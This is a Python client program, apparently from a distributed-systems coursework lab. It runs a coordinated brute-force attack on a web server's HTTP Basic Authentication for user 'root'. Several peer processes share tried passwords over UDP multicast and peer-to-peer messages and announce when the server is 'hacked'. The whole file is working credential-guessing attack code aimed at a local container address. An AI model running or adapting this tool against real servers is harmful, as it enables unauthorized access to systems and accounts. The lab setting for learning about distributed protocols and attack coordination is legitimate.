"""Slave client program"""

import string, base64, json, random, selectors, socket, struct, threading, time, server.const as const 
from src.protocol import HackProto, HackProtoBadFormat

_HOST = "172.17.0.2" 
_PORT = 8000

MCAST_ID = random.randint(1, 100)
MCAST_GROUP = '224.1.1.1'
MCAST_PORT = 5000

_CHARACTERS = string.ascii_uppercase + string.ascii_lowercase + string.digits
_LISTCHARACTERS = list(_CHARACTERS)
class Slave:
    """Slave client process."""

    def __init__(self, toPrint: bool = False):
        """Initialize multicast socket"""
        self.mcast = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.mcast.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sel = selectors.DefaultSelector()
        self.mcast.bind(("", MCAST_PORT))
        mreq = struct.pack("4sl", socket.inet_aton(MCAST_GROUP), socket.INADDR_ANY)
        self.connections = []

        self.mcast.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.mcast.setblocking(0)
        self.sel.register(self.mcast, selectors.EVENT_READ, self.read)
        cThread = threading.Thread(target=self.loop)
        cThread.daemon = True
        cThread.start()

        """Initialize unicast UDP socket for P2P"""
        self.p2p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.p2p.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.p2p.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.p2p.bind((MCAST_GROUP, MCAST_PORT + MCAST_ID))
        self.p2p.setblocking(0)
        self.peer = None

        """Initiate Attack"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((_HOST, _PORT))
        self.getHTTP = 'GET / HTTP/1.1\r\n'
        self.Host = 'Host: localhost\r\n'

        self.attempt = 0
        self.ServerPassword = ""   
        self.alreadyTested = []
        self.testedByMe = []
        self.hacked = False
        self.server_data = None
        self.toPrint = toPrint

        msg = HackProto.get_msg(HackProto.hello(str(MCAST_ID), str(self.p2p)))
        self.mcast.sendto(msg.encode('utf-8'), (MCAST_GROUP, MCAST_PORT))

    def read(self, conn, mask):
        """Read and process multicast group messages"""
        while True:
            msg = ""
            while len(msg) == 0:
                try:
                    msg = self.mcast.recv(10240)

                except BlockingIOError:
                    try:
                        msg, _addr = self.p2p.recvfrom(4096)

                    except BlockingIOError:
                        if len(msg) > 0:
                            break
                    except HackProtoBadFormat as e:
                        msg = e.original_msg

                except HackProtoBadFormat as e:
                    msg = e.original_msg

            if msg:
                msg = json.loads(msg)
                if msg["command"] == "hello":
                    if msg["id"] not in self.connections:
                        self.connections.append(msg["id"])
                    msg = HackProto.get_msg(HackProto.welcome(str(MCAST_ID), self.alreadyTested, str(self.sock)))
                    self.mcast.sendto(msg.encode('utf-8'), (MCAST_GROUP, MCAST_PORT))  
                    self.update()
                elif msg["command"] == "welcome":
                    if msg["id"] not in self.connections:
                        self.connections.append(msg["id"])
                    if len(self.alreadyTested) < len(msg["guesses"]):
                        self.alreadyTested = msg["guesses"]
                    self.update()
                elif msg["command"] == "guess":
                    print(f"The server was hacked. The password is: \"{msg['server_pwd']}\"\n")
                    self.hacked = True
                    return
                elif msg["command"] == "try":
                    self.alreadyTested.append(msg['password'])
                    msg = HackProto.get_msg(HackProto.peerguess(msg['password']))
                    if self.peer != None:
                        self.p2p.sendto(msg.encode('utf-8'), self.peer)
                elif msg["command"] == "peerTry":
                    self.alreadyTested.append(msg['password'])
                elif msg["command"] == "leaving":
                    if msg['id'] == MCAST_ID:
                        return
                    self.connections.remove(str(msg['id']))
                    self.update()

    def update(self):
        """Update P2P connections"""
        ids = []
        for key in self.connections:
            ids.append(key)
        ids.sort(key = lambda x : int(x))
        idx = ids.index(str(MCAST_ID))
        peer_id = -1
        
        if idx == len(ids)-1 and len(ids) > 1:
            peer_id = ids[0]
        elif len(ids) > 1:
            peer_id = ids[idx+1]
        else:
            peer_id = -1
            self.peer = None
        if int(peer_id) > 0:
            self.peer = ((MCAST_GROUP, MCAST_PORT + int(peer_id)))

    def attack(self):
        """Attack the web server"""
        try:
            self.guess()
            while True:
                if self.hacked:
                    return self.server_data, self.alreadyTested, self.testedByMe
                data = self.recvAll()
                if len(data) >= 1:
                    if b'HTTP/1.1 200 OK\r\n' in data:
                        return self.guessed(data)
                    else:
                        data = data.decode('utf-8')
                        self.log(data)
                        COOLDOWN_TIME_inSEC = (const.COOLDOWN_TIME / 1000) + (100 / 1000)
                        time.sleep(COOLDOWN_TIME_inSEC)
                        self.guess()
        except KeyboardInterrupt:
            msg = HackProto.get_msg(HackProto.leave(MCAST_ID))
            self.mcast.sendto(msg.encode('utf-8'), (MCAST_GROUP, MCAST_PORT))
            self.log("Disconnecting client & informing P2P Network....")
            self.sock.close()
            return None, None, None

    def guess(self):
        """Try to guess server's password"""
        self.attempt += 1
        self.log("\nAttempt #" + str(self.attempt) + "-----------------------")
        temp = self.alreadyTested.copy()
        self.alreadyTested = []
        [self.alreadyTested.append(x) for x in temp if x not in self.alreadyTested]
        self.ServerPassword = random.choices(_LISTCHARACTERS, k=const.PASSWORD_SIZE)
        while(self.convert(self.ServerPassword) in self.alreadyTested):
            self.ServerPassword = random.choices(_LISTCHARACTERS, k=const.PASSWORD_SIZE)
            if len(self.alreadyTested) >= len(_LISTCHARACTERS)**const.PASSWORD_SIZE:
                self.alreadyTested = []
        self.ServerPassword = self.convert(self.ServerPassword)
        self.log("Testing '" + self.ServerPassword + "' as server's password")
        authenticate = base64.b64encode(("root:" + self.ServerPassword).encode('utf-8'))
        Auth = 'Authorization: Basic ' + str(authenticate, 'utf-8')
        self.sock.send((self.getHTTP+self.Host+Auth+'\r\n\r\n').encode('utf-8'))
        msg = HackProto.get_msg(HackProto.guess(self.ServerPassword))
        self.alreadyTested.append(self.ServerPassword)
        self.testedByMe.append(self.ServerPassword)
        if self.peer != None:
            self.p2p.sendto(msg.encode('utf-8'), self.peer)
        if self.attempt % 5 == 0:
            self.update()

    def guessed(self, data: bytes):
        """The server password was guessed."""
        data = data.split(b'\r\n\r\n')
        HTML_header = data[0].decode('utf-8')
        server_data = data[1]
        self.log(HTML_header)


        msg = HackProto.get_msg(HackProto.guessed(self.ServerPassword))
        self.mcast.sendto(msg.encode('utf-8'), (MCAST_GROUP, MCAST_PORT))

        return server_data, self.alreadyTested, self.testedByMe

    def recvAll(self, timeout=0.1):
        """Receive all data from web server"""
        self.sock.setblocking(0)
        
        total_data=[]
        data=''
        
        begin=time.time()
        while 1:
            if total_data and time.time()-begin > timeout:
                break
            elif time.time()-begin > timeout*2:
                break

            try:
                data = self.sock.recv(8192)
                if data:
                    total_data.append(data)
                    begin=time.time()
                else:
                    time.sleep(0.1)
            except BlockingIOError:
                pass
        
        return b''.join(total_data)

    def convert(self, listchar):
        """Convert guess password from list to string"""
        str = ""
    
        for char in listchar:
            str += char

        return str

    def loop(self):
        """Loop indefinetely."""
        while True:
            events = self.sel.select()
            for key, mask in events:
                callback = key.data
                callback(key.fileobj, mask)
    
    def log(self, toPrint: str):
        """Print (or don't) function"""
        if self.toPrint:
            print(toPrint)